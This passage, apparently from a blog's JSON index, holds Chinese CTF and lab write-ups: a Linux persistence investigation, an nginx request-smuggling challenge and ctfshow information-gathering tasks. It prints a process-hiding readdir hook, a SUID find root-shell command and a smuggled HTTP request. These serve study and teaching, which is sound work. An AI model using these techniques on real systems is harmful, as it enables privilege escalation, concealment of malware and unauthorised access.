strcmp(dir_name, \"/proc\") == 0 &&                       \\\n                get_process_name(dir->d_name, process_name) &&          \\\n                strcmp(process_name, process_to_filter) == 0) {         \\\n                continue;                                               \\\n            }                                                           \\\n        }                                                               \\\n        break;                                                          \\\n    }                                                                   \\\n    return dir;                                                         \\\n}\n\nDECLARE_READDIR(dirent64, readdir64);\nDECLARE_READDIR(dirent, readdir);\n\n```\n\n总的来说\n\n这个 `processhider.c` 文件的目的是通过动态链接库拦截 `readdir` 系统调用，来隐藏特定名称的进程（在这个中是 `1.py`）的目录项，使其在进程列表中不可见。\n\n```c\nstatic const char* process_to_filter = \"1.py\";\n```\n\n这段代码指定要隐藏的进程为1.py，所以我们可以确定这个1.py就是黑客想要隐藏的文件了，直接md5加密路径然后提交就行\n\n## 问题2:黑客隐藏的文件反弹shell的ip+端口 {ip:port}\n\n这个的话因为上一题已经分析处理1.py就是隐藏文件，在1.py里面就有反弹shell的远程服务器iip和端口，直接交flag就行，没什么好讲的\n\n## 问题3:黑客提权所用的命令 完整路径的md5 flag{md5}\n\n让我们提交黑客提权使用的命令，那我们就要去分析日志和文件了，后面分析发现是需要查看以下文件：\n\n- /etc/passwd\n- /etc/sudoers\n- 具有SUID位设置的文件\n\n### **什么是SUID提权**\n\nSUID（Set User ID）是 Unix/Linux 文件系统中的一种权限位。当文件的 SUID 位被设置时，执行该文件的用户将临时获得文件所有者的权限。这通常用于程序需要执行一些需要更高权限的操作（例如，`ping` 命令需要发送 ICMP 请求，因此需要 root 权限）。\n\n### 怎么进行SUID提权\n\n- 查找 SUID 文件： 使用 find 命令查找系统中的所有 SUID 文件：\n\n\nfind / -perm -u=s -type f 2>/dev/null\n\n- 检查可疑文件： 查看找到的 SUID 文件，寻找常见的提权工具（如 nmap、vim、find、awk、perl 等）是否在列表中。这些工具如果被设置为 SUID，有可能被利用来执行任意命令。\n\n\n- 利用漏洞： 如果找到的 SUID 文件有已知的漏洞，可以利用这些漏洞来执行任意命令。例如，某些版本的 nmap 可以通过 --interactive 模式获得一个 shell，进而提权。\n\n那我们应该如何检查文件是否被进行提权呢\n\n### **如何判断文件是否可能被利用进行提权？**\n\n- 不应拥有 SUID 位的程序： 如常见编辑器（vim）、网络工具（tcpdump）、脚本语言解释器（perl）等。如果这些程序被设置了 SUID 位，通常是异常情况，需要进一步检查。\n\n- 检查文件的所有权和权限： 例如，一个 root 所有的文件，其权限中包含 SUID 位，可以通过 ls -l 命令查看文件的详细信息。如果发现可疑文件，可以进一步分析其行为。\n\n这里我们讲解一个示例\n\n- 利用SUIDfind获取root shell\n\n假设 find 命令具有 SUID 位，可以使用以下方法获取 root shell：\n\n```\n/usr/bin/find . -exec /bin/sh \\; -quit\n```\n\n这里，find 将在当前目录（.）搜索，并使用 -exec 选项执行 /bin/sh（一个新的 shell）。因为 find 具有 SUID 位，这个 shell 将以 root 权限运行。\n\n\n这里我们使用命令:\n\n```\nfind / -perm -u=s -type f 2>/dev/null\n```\n\n这个命令用于查找系统上所有设置了 SUID 位的文件。具体解释如下：\n\n- find /: 从根目录开始查找。\n\n- -perm -u=s: 查找文件权限中包含 SUID 位（即，用户执行该文件时将获得该文件所有者的权限）。\n- -type f: 只查找文件（不包括目录）。\n- 2>/dev/null: 将标准错误输出重定向到 /dev/null，以避免显示权限不足等错误信息。\n\n![image-20241123114551853](./../image/achieve/202411/玄机第三章权限维持/image-20241123114551853.png)\n\n这些就是被设置了SUID的文件，我们先进行简单的分析一下\n\n从里面不难看出/usr/bin/find被进行了提权，那有人就要问了，为什么我们要从中选出这个进行分析呢\n\n**在文件列表中，`/usr/bin/find` 是一个特别值得关注的 SUID 文件，因为 `find` 命令具有一些可以被恶意利用的特性**\n\n### 什么是find命令\n\n`find` 是一个非常强大的命令行工具，用于在目录树中搜索文件并执行各种操作。`find` 可以执行指定的命令或脚本，这使得它在具有 SUID 位时变得特别危险。\n\n当 `find` 命令设置了 SUID 位，并且该命令存在已知漏洞或不当配置，攻击者可以利用它来执行任意命令，从而提升权限\n\n我们先检查一下find命令的权限\n\n```\nls -l /usr/bin/find\n```\n\n![image-20241123114926772](./../image/achieve/202411/玄机第三章权限维持/image-20241123114926772.png)\n\n```\n-rwsr-xr-x. 1 root root 229992 Jan  6  2014 /usr/bin/find\n```\n\n我们来分析一下这个find命令\n\n### 权限字符\n\n| 权限组                | 权限字符 | 含义                                |\n| --------------------- | -------- | ----------------------------------- |\n| 1. 所有者（owner）    | `rws`    | 读取（r）、写入（w）、可执行（s）   |\n| 2. 用户组（group）    | `r-x`    | 读取（r）、不可写（-）、可执行（x） |\n| 3. 其他用户（others） | `r-x`    | 读取（r）、不可写（-）、可执行（x） |\n\n`rws` 表示文件所有者（root）具有 SUID 位（`s`），并且文件的所有者是 root，用户组和其他用户可以读取和执行该文件，但不能修改它。\n\n所以这里不难看出find命令就是被黑客进行提权的命令\n\n### 为什么 find 特别危险？\n\n- 强大的功能： find 命令可以执行任意命令或脚本，这意味着如果用户能够控制 find 的输入，他们可以执行任意代码。\n- 常见漏洞： 许多历史版本的 find 命令存在已知漏洞，允许攻击者以 root 权限执行任意代码。\n- 广泛使用： find 是一个常用工具，很多系统管理员和用户都习惯使用它，且往往忽略其安全隐患。\n\n总的来说，在 SUID 文件列表中，`/usr/bin/find` 因其强大的功能和历史漏洞，可以直接进行提权。攻击者可以利用 SUID `find` 的 `-exec` 选项执行任意命令，从而获得高权限（如 root 权限）的 shell。\n\n所以问题3的命令就是find，目录就是/usr/bin/find\n\n## 问题4：黑客尝试注入恶意代码的工具完整路径md5\n\n### 常用的注入工具\n\n**包括了不同类型的工具，如命令注入、SQL注入、代码注入等**\n\n- SQLMap\n\n\n描述：一个开源的自动化SQL注入工具，能够识别和利用SQL注入漏洞并接管数据库服务器。\n\n用法：适用于各种数据库管理系统（如MySQL、PostgreSQL、Oracle、Microsoft SQL Server等）的SQL注入攻击。\n\n- Havij\n\n描述：一个自动化的SQL注入工具，具有图形用户界面，能够轻松利用SQL注入漏洞。\n\n用法：用于挖掘和利用SQL注入漏洞，特别适用于初学者。\n\n- SQLNinja\n\n描述：一个专门针对Microsoft SQL Server的SQL注入工具。\n\n用法：帮助攻击者利用SQL注入漏洞获取系统权限。\n\n- JSQL Injection\n\n描述：一个开源的跨平台SQL注入工具，支持多种数据库。\n\n用法：提供图形用户界面，便于用户进行SQL注入攻击。\n\n- Burp Suite\n\n描述：一个用于测试Web应用程序安全性的综合工具，具有SQL注入模块。\n\n用法：手动和自动化的SQL注入测试。\n\n- Commix\n\n描述：一个自动化的命令注入和命令执行工具。\n\n用法：帮助发现和利用Web应用程序中的命令注入漏洞。\n\n- Metasploit\n\n描述：一个渗透测试框架，包含多个注入模块（包括SQL注入、命令注入等）。\n\n用法：广泛用于渗透测试和漏洞利用。\n\n- Cymothoa\n\n描述：一个后门工具，用于将用户空间代码注入到正在运行的进程中。\n\n用法：常用于在受感染的系统上持久化存在并隐蔽地运行恶意代码。\n\n- BeEF (Browser Exploitation Framework)\n\n描述：一个浏览器攻击框架，用于利用浏览器漏洞并在受害者浏览器上执行恶意代码。\n\n用法：通过浏览器注入代码并控制受害者浏览器会话。\n\n- W3af (Web Application Attack and Audit Framework)\n\n描述：一个Web应用程序安全扫描器和攻击框架，支持多种注入攻击（如SQL注入、命令注入等）。\n用法：用于自动化扫描和攻击Web应用程序。\n\n工具讲完了，我们就一个个找就行了\n\n### /opt目录\n\n**因为在Linux系统中，通常将 `/opt` 目录用于存放可选的、占用空间较大的第三方软件和应用程序。这些程序通常不是系统自带的，也不是通过系统包管理器（如apt、yum等）安装的。**\n\n所以我们先看一下/opt目录\n\n![image-20241123120339129](./../image/achieve/202411/玄机第三章权限维持/image-20241123120339129.png)\n\n发现这里有一个文件被隐藏起来了，初步判断是黑客隐藏的恶意文件，我们跟进看一下\n\n![image-20241123120537619](./../image/achieve/202411/玄机第三章权限维持/image-20241123120537619.png)\n\n发现了Cymothoa后门工具，直接提交这个工具的具体目录就行\n\n完整路径:/opt/.cymothoa-1-beta/cymothoa\n\n我们介绍一下这个后门工具哈\n\n### **Cymothoa后门工具**\n\n这里直接放大佬的笔记了，我只写了基本概念，如何使用的话可以参考大佬的笔记\n\n[Cymothoa后门工具 - 卿先生 - 博客园](https://www.cnblogs.com/-qing-/p/10519363.html#_lab2_0_0)\n\nCymothoa 是一款可以将 shellcode 注入到现有进程的（即插进程）后门工具。借助这种注入手段，它能够把shellcode伪装成常规程序。它所注入的后门程序应当能够与被注入的程序（进程）共存，以避免被管理和维护人员怀疑。将shellcode注入到其他进程，还有另外一项优势：即使目标系统的安全防护工具能够监视可执行程序的完整性，只要它不检测内存，那么它就不能发现（插进程）后门程序的进程。\n\n## 问题5：使用命令运行 ./x.xx 执行该文件 将查询的 Exec****** 值作为flag提交 flag{/xxx/xxx/xxx}\n\n我们先了解一下什么是exec值\n\n### Exec值\n\n**就是Linux系统中的 Exec 相关字段，通常用于查看程序执行时的权限设置**。这些字段通常可以在文件系统的详细信息（如 ls -l 命令的输出）中找到。具体来说：\n\n- 文件权限字段解释：\n\n\n文件或目录权限显示的第一个字段是 Exec 字段。\n\n对于文件，这个字段的值代表了文件的执行权限。\n\n对于目录，这个字段的值表示该目录是否可以被执行（进入）。\n\n- 具体取值：\n\n如果该字段显示为 r，表示文件具有读权限。\n\n如果该字段显示为 w，表示文件具有写权限。\n\n如果该字段显示为 x，表示文件具有执行权限。\n\n如果该字段显示为 -，表示文件没有相应的权限。\n\n- 举个例子；\n\n例如，一个文件的详细信息可能如下所示：\n\n-rwxr-xr--\n\n在这个例子中，Exec 字段的值为 -rwxr-xr--，这表示：\n\n所有者（Owner）有读、写、执行权限（rwx）。\n组（Group）有读、执行权限（r-x）。\n其他用户（Others）只有读权限（r–）。\n因此，通过查看文件或目录的详细信息，可以了解到文件的具体权限设置，包括是否具有执行权限。\n\n这里的话是需要我们去运行1.py文件并将exec值提交\n\nCat 查看1.py：\n\n```python\nroot@xuanji:/opt/.cymothoa-1-beta# cat /tmp/.temp/libprocesshider/1.py\n#!/usr/bin/python3\n \nimport socket,subprocess,os,sys, time\n```\n\n发现默认是“#!/usr/bin/python3” ，即pyton3运行1.py\n\n那我们就先运行一下1.py文件，并查看端口情况判断是否成功执行\n\n```\npython3 1.py\nnetstat -anlpt\n```\n\n![image-20241123122116964](./../image/achieve/202411/玄机第三章权限维持/image-20241123122116964.png)\n\n这里可以看到是成功执行了并且有网络连接\n\n**据之前已经可以确认IP地址：114.114.114.121:9999就是反弹shell的IP，**\n\n那我们查找一下python3\n\n```\nwhich python3\n```\n\n![image-20241123122304188](./../image/achieve/202411/玄机第三章权限维持/image-20241123122304188.png)\n\n看到目录了我们就直接查看这个文件的权限设置，找到我们想要的exec值\n\n```\nls -la /usr/bin/python3\n```\n\n![image-20241123122352244](./../image/achieve/202411/玄机第三章权限维持/image-20241123122352244.png)\n\n所以flag就是flag{/usr/bin/python3.4}\n\n其实这里我也很奇怪，为啥是python3.4\n\n- 由于 `/usr/bin/python3` 指向 `python3.4`，并且在文件的权限字段中显示有 `rwx`（读、写、执行权限），因此 `Exec` 值被设置为表示这个文件是可执行的。\n\n- `/usr/bin/python3` 是一个符号链接（软链接），指向 `python3.4`。\n\n所以，根据符号链接指向的实际文件 `python3.4` 的权限设置，`/usr/bin/python3` 作为一个符号链接，继承了指向文件的执行权限。\n","tags":["玄机第三章权限维持"],"categories":["玄机"]},{"title":"蜀道山高校联合公益赛","url":"/2024/11/17/蜀道山高校联合公益赛/","content":"\n\n\n# **海关警察训练平台**\n\n![image-20241117144548622](./../image/achieve/202411/蜀道山高校联合公益赛/image-20241117144548622.png)\n\n查看一下源代码\n\n![image-20241117151610382](./../image/achieve/202411/蜀道山高校联合公益赛/image-20241117151610382.png)\n\n这里可以看到当flag===1 的时候会导航到里面的url，也就是url/error，那我们访问一下看看\n\n![image-20241117152027775](./../image/achieve/202411/蜀道山高校联合公益赛/image-20241117152027775.png)\n\n发现出现按302跳转了，跳到了当前这个路径，最后可以提示是nginx的服务器，猜测是不是服务器的版本cve漏洞\n\n在开发者模式中看一下当前服务器版本\n\n![image-20241117152215972](./../image/achieve/202411/蜀道山高校联合公益赛/image-20241117152215972.png)\n\n发现不是nginx的服务器而是apache的服务器，而且还没有版本号\n\n我们返回去看一下原来的服务器版本\n\n![image-20241117152322535](./../image/achieve/202411/蜀道山高校联合公益赛/image-20241117152322535.png)\n\n发现这时候是nginx/1.17.6的版本号\n\n搜一下这个版本的cve，发现有一个CVE-2019-20372跟我们的漏洞有点像\n\nhttps://www.cnblogs.com/null1433/p/12778026.html\n\n## 漏洞简介\n\nNginx 1.17.7之前版本中 error_page 存在安全漏洞。攻击者可利用该漏洞读取未授权的Web页面。而题目中的flag在内网的地址应该就是我们未授权的web页面\n\n## HTTP请求走私\n\nHTTP请求走私攻击，顾名思义，就会像走私一样在一个HTTP请求包中夹带另一个或多个HTTP请求包，在前端看来是一个HTTP请求包，但是到了后端可能会被解析器分解开从而导致夹带的HTTP请求包也会被解析，最终可以导致未授权访问敏感数据或攻击其他用户。\n\n说白了就是在一个包里面发两个请求包让后端进行解析去访问我们需要访问的web页面\n\n### HTTP请求走私漏洞如何产生？\n\n大多数HTTP请求走私漏洞的出现是因为HTTP规范提供了两种不同的方法来指定请求的结束位置：`Content-Length`标头和`Transfer-Encoding`标头。\n\n该`Content-Length`头是直接的：它指定消息体的以字节为单位的长度。例如:\n\n```html\nPOST /search HTTP/1.1\nHost: normal-website.com\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 11\n\nq=smuggling\n```\n\n该`Transfer-Encoding`首标可以被用于指定该消息体的用途分块编码。这意味着消息正文包含一个或多个数据块。每个块均由以字节为单位的块大小（以十六进制表示）组成，后跟换行符，然后是块内容。该消息以大小为零的块终止。例如\n\n```php\nPOST /search HTTP/1.1\nHost: normal-website.com\nContent-Type: application/x-www-form-urlencoded\nTransfer-Encoding: chunked\n\nb\nq=smuggling\n0\n```\n\n### HTTP请求走私类型\n\n#### CL不为0的GET请求\n\n前端代理服务器允许GET请求携带请求体，但后端服务器不允许GET请求携带请求体，则后端服务器会忽略掉GET请求中的`Content-Length`，不进行处理，从而导致请求走私。\n\n我们可以向服务器发起以下请求\n\n```\nGET /a HTTP/1.1\nHost: localhost\nContent-Length: 56\nGET /_hidden/index.html HTTP/1.1\nHost: notlocalhost\n```\n\n我们看一下服务器是怎么处理的\n\n```\nHTTP/1.1 302 Moved Temporarily\nServer: nginx/1.17.6\nDate: Fri, 06 Dec 2019 18:23:33 GMT\nContent-Type: text/html\nContent-Length: 145\nConnection: keep-alive\nLocation: http://example.org\n<html>\n<head><title>302 Found</title></head>\n<body>\n<center><h1>302 Found</h1></center>\n<hr><center>nginx/1.17.6</center>\n</body>\n</html>\nHTTP/1.1 200 OK\nServer: nginx/1.17.6\nDate: Fri, 06 Dec 2019 18:23:33 GMT\nContent-Type: text/html\nContent-Length: 22\nConnection: keep-alive\nThis should be hidden!\n```\n\n前端服务器收到该请求，通过读取`Content-Length`，判断这是一个完整的请求，然后转发给后端服务器，而后端服务器收到后，因为它不对`Content-Length`进行处理，由于`Pipeline`的存在，它就认为这是收到了两个请求。\n\n上面只讲了跟本道题有关的类型，其他的类型我直接引入一位师傅的文章了，方便以后随时打开看\n\n[详细笔记+实验：HTTP请求走私 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/web/243652.html)\n\n解题\n\n直接用bp发包就行\n\n![image-20241117160428914](./../image/achieve/202411/蜀道山高校联合公益赛/image-20241117160428914.png)\n\n不过我一开始没跑出来，后面发现少了两个\\r\\n,我们可以打开\\n看看\n\n![image-20241117161959025](./../image/achieve/202411/蜀道山高校联合公益赛/image-20241117161959025.png)\n\n只做出来这道题，环境复现的开放时间我刚好在上课，只能后面看看还有没有环境复现 的机会再返回来写这个了\n","tags":["蜀道山高校联合公益赛"],"categories":["赛题wp"]},{"title":"web入门信息搜集篇-ctfshow","url":"/2024/11/15/web入门信息搜集篇-ctfshow(已做完)/","content":"\n# **信息收集**\n\n**知识点:**\n\n1.学会从信息中找到重要的隐藏信息(例如查看页面源代码)\n\n2.学会一些基本的网络协议\n\n3.学会使用dirsearch查看页面目录信息\n\n4.学会在burpsuit e中查看信息\n\n## **web1:**\n\n按f12查看源代码\n\n## **web2:**\n\n考点:js前台拦截\n\n1.用ctrl+u可以查看源代码（在浏览器地址栏中输入 view-source: URL）\n\n### **view-source知识点:**\n\nview-source是一种协议，早期基本上每个浏览器都支持这个协议。后来Microsoft考虑安全性，对于WindowsXP pack2以及更高版本以后IE就不再支持此协议。但是这个方法在FireFox和Chrome浏览器都还可以使用。 \n\n2.禁用JavaScript，再重新按f12\n\n## **web3:**\n\n用burpsuite抓包\n\n## **web4:**\n\n考点:网站robots协议\n\n### **网站robots协议**\n\nrobots是搜索引擎爬虫协议，也就是你网站和爬虫的协议。\n\n**简单的理解：**robots是告诉搜索引擎，你可以爬取收录我的什么页面，你不可以爬取和收录我的那些页面。robots很好的控制网站那些页面可以被爬取，那些页面不可以被爬取。\n\n**主流的搜索引擎都会遵守robots协议**。并且robots协议是爬虫爬取网站第一个需要爬取的文件。爬虫爬取robots文件后，会读取上面的协议，并准守协议爬取网站，收录网站。\n\n**robots文件是一个****纯文本文件****，也就是常见的.txt文件**。在这个文件中网站管理者可以声明该网站中不想被robots访问的部分，或者指定搜索引擎只收录指定的内容。因此，robots的优化会直接影响到搜索引擎对网站的收录情况。\n\n**存放目录:robots文件必须要存放在网站的根目录下**。也就是 域名/robots.txt 是可以访问文件的。你们也可以尝试访问别人网站的robots文件。 输入域名/robots.txt 即可访问。\n\nrobots写法\n\n**User0agent:\\***\n\n**Disallow: /?s\\***\n\n**Disallow: /wp-\\***\n\nuser-agent这句代码表示那个搜索引擎准守协议。user-agent后面为搜索机器人名称，如果是“*”号，则泛指所有的搜索引擎机器人；案例中显示“User-agent: *” 表示所有搜索引擎准守，*号表示所有。\n\nDisallow是禁止爬取的意思。Disallow后面是不允许访问文件目录（你可以理解为路径中包含改字符、都不会爬取）。案例中显示“Disallow: /?s*” 表示路径中带有“/?s”的路径都不能爬取。 *代表匹配所有。 这里需要主机。 Disallow空格一个，/必须为开头。\n\n如果“Disallow: /” 因为所有路径都包含/ ，所以这表示禁止爬取网站所有内容。\n\n**所以如果没有被禁止到的路径，默认为可以被爬取。**\n\n**做法:在url中访问robots.txt文件**\n\n## web5:\n\n考点:PHPS文件泄露\n\n### **PHPS文件**\n\n**phps文件**就是php的源代码文件，通常用于提供给用户（访问者）直接通过Web浏览器查看php代码的内容。因为用户无法直接通过Web浏览器“看到”php文件的内容，所以需要用phps文件代替。用户访问phps文件就能看到对应的php文件的源码。\n\n做法:phps文件泄露，phps存放着php源码,可通过尝试问/index.phps读取,或者尝试扫描工具（dirsearch）扫描读取\n\ndirsearch -u URL -e*\n\n命令 dirsearch -u url -e* 中的参数解释如下：\n\n- -u url：指定要扫描的目标URL。这里的 url 需要被替换为实际的URL\n- -e*：这是一个扩展选项，用于指定要扫描的文件扩展名。星号 * 是一个通配符，表示扫描所有可能的文件扩展名。这意味着 dirsearch 会尝试发现服务器上所有可能的文件和目录，而不仅仅是具有特定扩展名的文件。\n- 在实际情况中，你会根据具体的目标站点和应用，有针对性地选择某些常见的文件扩展名进行扫描，比如 .php, .bak, .sql, .config 等，以减少扫描时间和噪声。\n\n## **web6:**\n\n考点:网站备份文件漏洞\n\n### **网站备份文件漏洞:3**\n\n- 网站备份压缩文件 漏洞成因:在网站的升级和维护过程中，通常需要对网站中的文件进行修改。此时就需要对网站整站或者其中某一页面进行备份。当备份文件或者修改过程中的缓存文件因为各种原因而被留在网站 web 目录下，而该目录又没有设置访问权限时，便有可能导致备份文件或者编辑器的缓存文件被下载，导致敏感信息泄露，给服务器的安全埋下隐患。\n- **该漏洞的成因**主要有是管理员将备份文件放在到 web 服务器可以访问的目录下。\n- 该漏洞往往会导致服务器整站源代码或者部分页面的源代码被下载，利用。源代码中所包含的各类敏感信息，如服务器数据库连接信息，服务器配置信息等会因此而泄露，造成巨大的损失。\n- 被泄露的源代码还可能会被用于代码审计，进一步利用而对整个系统的安全埋下隐患。\n\n做法:\n\n1.尝试用扫描工具(dirsearch)扫描读取\n\ndirsearch -u URL -e*\n\n2.找到www.zip文件，在URL中访问这个文件下载下来，读取里面的flag(或者在URL里面访问这个文件也可以)\n\n## **web7:**\n\n考点:.git信息泄露\n\n### **.git信息泄露**\n\n- Git是目前世界上最先进的**分布式版本控制系统**（没有之一）\n- 开发人员在开发时，常常会先把源码提交到远程托管网站（如github），最后再从远程托管网站把源码pull到服务器的web目录下，如果忘记把.git文件删除，就造成此漏洞。利用.git文件恢复网站的源码，而源码里可能会有数据库的信息。\n- 当前大量开发人员使用git进行版本控制，对站点自动部署。 如果配置不当，可能会将.git文件夹直接部署到线上环境，这就引起了git泄露漏洞。\n- .git源码泄露：采用git管理项目时，上传项目忘记删除.git文件，攻击者可通过该文件恢复源码历史版本，从而造成源码泄露\n\n如何修复\n\n1. 对.git目录的访问权限进行控制\n2. 在每次pull到web目录下之后删除.git文件夹\n\n参考:[Git与Git文件导致源码泄露_当前大量开发人员使用git进行版本控制,对站点自动部署。如果配置不当,可能会将.gi-CSDN博客](https://blog.csdn.net/qq_45521281/article/details/105767428)\n\n做法:\n\n1.访问url/.git/index.php，通过信息泄露发现flag\n\n2.用dirsearch工具扫描目录，扫描到url.git这个目录，访问获取flag\n\n## **web8:**\n\n考点:svn信息泄露\n\n### **svn信息泄露**\n\n- SVN（subversion）是程序员常用的源代码版本管理软件。在使用 SVN 管理本地代码过程中，使用 svn checkout 功能来更新代码时，项目目录下会自动生成隐藏的.svn文件夹（Linux上用 ls 命令看不到，要用 ls -al 命令），其中包含重要的源代码信息。\n- 造成SVN源代码漏洞的主要原因是管理员操作不规范，一些网站管理员在发布代码时，不愿意使用“导出”功能，而是直接复制代码文件夹到WEB服务器上，这就使得.svn隐藏文件夹被暴露于外网环境，黑客对此可进一步利用：\n- 可以利用其中包含的用于版本信息追踪的 entries 文件（.svn/entries 文件），获取到服务器源码、svn服务器账号密码等信息；\n- 可以利用 wc.db 数据库文件（.svn/wc.db 文件），获取到一些数据库信息；\n- 更严重的问题在于，SVN产生的.svn目录下还包含了以.svn-base结尾的源代码文件副本（低版本SVN具体路径为text-base目录，高版本SVN为pristine目录），如果服务器没有对此类后缀做解析，则可以直接获得文件源代码。\n\n漏洞修复\n\n1、不要使用svn checkout和svn up更新服务器上的代码，使用svn export（导出）功能代替；\n\n2、服务器软件（Nginx、apache、tomcat、IIS等）设置目录权限，禁止访问.svn目录；\n\n3、删除 /.svn 文件夹，注意，不只svn，git 或者其他版本管理软件也存在类似的问题。\n\n参考:[Web安全-SVN信息泄露漏洞分析_svn漏洞-CSDN博客](https://blog.csdn.net/weixin_39190897/article/details/109306693)\n\n做法:\n\n1.访问url/.svn，通过信息泄露发现flag\n\n2.用dirsearch工具扫描目录，扫描到url.svn这个目录，访问获取flag\n\n## **web9:**\n\n考点:vim缓存导致信息泄露\n\n### **vim缓存**\n\n- vim缓存导致信息泄露:在使用vim时会创建临时缓存文件，关闭vim时缓存文件则会被删除，当vim异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容\n- swp是vim编辑器的临时交换文件，即swap（交换分区）的简写。是一个隐藏文件。用来备份缓冲区的内容，如果未对文件进行修改，是不会产生swp文件的。\n- 以 index.php 为例：\n\n第一次产生的交换文件名为 .index.php.swn\n\n再次意外退出后，将会产生名为 .index.php.swo 的交换文件\n\n第三次产生的交换文件则为 .index.php.swn\n\n做法:\n\n根据题目提示，“在生产环境vim改下，不好，死机了”说明是vim异常导致缓存文件保存，从而导致信息泄露\n\n所以直接访问.index.php.swp\n\n## **web10**\n\n考点:cookie请求头\n\n### **cookie**\n\ncookie一般用于在身份认证的过程中保存一些信息，用于服务器来验证身份\n\n做法:\n\n1.按f12然后在网络里查看cookie\n\n2.用burpsuite抓包查看cookie请求头\n\n不过flag用URL进行编码了，我们需要url解码才能拿到真正的flag\n\n## **web11**\n\n考点:查询域名解析\n\n### **查询域名**\n\n查询域名解析地址 基本格式：nslookup host [server]\n\n查询全部 基本格式：nslookup -query=any host [server]\n\n查询域名解析:nslookup -qt=类型 目标域名,IP地址\n\n做法:\n\n1.使用nslookup查看域名解析\n\nnslookup -qt=txt flag.ctfshow.com\n\n2.阿里云[阿里云网站运维检测平台 (aliyun.com)](https://boce.aliyun.com/detect/http)\n\nflag{just_seesee}\n\n## **web12**\n\n### **网上的公开信息可能是管理员常用密码**\n\n访问/robots.txt 或 使用dirsearch工具，发现子目录/admin\n\n访问url/admin，需要登录，管理员账号猜测为admin，密码根据提示“有时候网站上的公开信息，就是管理员常用密码”，查看靶机主页，发现底部有Help Line Number : 372619038， 尝试输入密码为372619038，登陆成功，获取flag。\n\n## **web13**\n\n### **技术文档里面不要出现敏感信息，部署到生产环境后及时修改默认密码**\n\n本题目的是让答题者了解到很多的文章有许多的文档，可以在这些文档中发现很多信息，例如文件中有许多的信息泄露的地方，本题在底部的document这个这个文本中记录到有地址和密码。\n\n## **web14**\n\n### **考点:editor**\n\n- editor很可能指的是一个网页编辑器或者文件编辑器，它在这个上下文中被用作一个功能组件或者服务，允许用户上传、编辑或者管理文件\n- 这个“editor”在默认配置下可能存在一个问题：如**果指定的上传目录不存在，它会尝试遍历服务器的根目录来查找文件**\n\n1. 上传目录\n\n：通常，Web应用程序会提供一个文件上传功能，允许用户将文件上传到服务器的特定目录中。这个目录被称为“上传目录”。\n\n1. 目录不存在\n\n：如果由于某种原因（如配置错误、路径错误或恶意输入），指定的上传目录在服务器上不存在，那么应用程序可能会尝试执行其他操作来处理这种情况。\n\n1. 遍历服务器的根目录\n\n：在这句话的上下文中，“遍历”意味着应用程序会尝试访问服务器上的其他目录，以查找或访问文件\n\n做法:\n\n1. 理解题目提示\n\n- 题目中给出了一个小0day提示：“某编辑器最新版默认配置下，如果目录不存在，则会遍历服务器根目录。有时候源码里面就能不经意间泄露重要（editor）的信息，默认配置害死人。”\n- 初步探索\n\n- 打开题目链接，进行常规探索，如查看网页源代码（Ctrl+U）、抓包等。\n- 在网页源代码中搜索与“editor”相关的内容，可能会发现图片文件被保存到“editor/upload”中。\n- 利用小0day进行目录遍历\n\n- 尝试访问“editor/upload”，如果响应结果为403（禁止访问），则表明没有直接的目录遍历漏洞。\n- 使用工具（如dirsearch）或手动尝试访问其他与“editor”相关的路径，可能会发现可以访问的“/editor/”目录。\n- 深入探索\n\n- 进入“/editor/”目录后，可能会看到一个类似文件上传的界面或功能。\n- 尝试点击图片空间或文件空间等选项，观察是否能够遍历服务器文件。\n- 找到关键文件\n\n- 由于“nothinghere”和当前的“/editor/”在同一级目录下，可以推测其中可能包含有用的文件。\n- 在“nothinghere”文件夹中，找到名为“fl000g.txt”的关键文件，该文件即为题目所要求的flag。\n- 读取flag\n\n- 要访问到“fl000g.txt”文件，可以直接在域名下输入“/nothinghere/fl000g.txt”。\n- 打开该文件后，即可看到题目所要求的flag内容。\n\n## **web15**\n\n### **知识点:社工**\n\n公开的信息比如邮箱，可能造成信息泄露，产生严重后果\n\n- url/admin是默认的网站系统后台地址\n\n做法:\n\n1.访问url/admin进入登录页面\n\n2.用户名默认为admin，然后猜一下密码，发现qq邮箱和qq都不对，发现一个忘记密码可以点开，问题是所在地，我当时还纳闷，这我怎么知道，后来根据题目提示去看qq邮箱，搜了一下qq号发现真的有，填写后就可以获取flag了\n\n## **web16**\n\n### 知识点:测试探针\n\n测试探针也是一种用于在计算机网络中监视、诊断和测试网络系统和服务的工具。它能够收集和分析网络数据，以识别性能瓶颈、安全漏洞和应用程序错误等问题。通过监测网络流量，测试探针可以帮助管理员识别网络中的延迟、丢包和带宽问题，而不必依赖网络用户的反馈或其他工具。\n\n- php探针是用来探测空间、服务器运行状况和PHP信息用的，探针可以实时查看服务器硬盘资源、内存占用、网卡 流量、系统负载、服务器时间等信息。 url后缀名添加/tz.php 版本是雅黑PHP探针\n\n使用方法\n\nPHP探针的使用方法通常包括以下几个步骤：\n\n1. 下载PHP探针文件到本地电脑。\n2. 使用FTP软件将探针文件上传到网站的任意目录中。\n3. 绑定域名后，通过类似“域名/探针文件名.php”的网址访问探针。\n\n## **web17**\n\n打开靶机，直接用dirsearch扫描目录，扫出了url/backup.sql\n\n访问url/backup.sql，自动下载了backup.sql\n\n打开backup.sql，即可获取flag\n\n## **web18**\n\n1.这是一个javascript 的游戏，游戏的目的就是让要赢，从js代码中可知，当score>120时，且game_over这个参数为false时，即可赢，于是打开开发者模式中的console，直接赋值score=130 game_over=false 然后，执行游戏 的run() 即可得到你赢了，去幺幺零点皮爱吃皮看看，就可以获得flag啦\n\n## **web19**\n\n1.打开题目是一个登录界面，我们先f12查看一下源代码看看有没有什么重要信息\n\n![](./../image/achieve/202411/GXYCTF/1731640288357.jpg)\n\n2.看到源码中if语句，意思是当账号为admin，密码为后面那串字符串的时候，就可以输出flag\n\n![](./../image/achieve/202411/GXYCTF/1731640317413.jpg)\n\n所以我们先试一下，发现是错的，应该是把密码加密了，我们去解密一下\n\na599ac85a73384ee3219fa684296eaa62667238d608efa8137030bd1ce1bf04\n\n​    ![](./../image/achieve/202411/GXYCTF/1731640322114.jpg)\n\nAES加密，参数全在js代码 中， mode模式： CBC padding填充方式； ZeroPadding 密文输出编码： 十六进制string； 偏移量iv: ilove36dverymuch 密钥：0000000372619038 密文为： a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04\n\n![](./../image/achieve/202411/GXYCTF/1731640326483.jpg)\n\n## 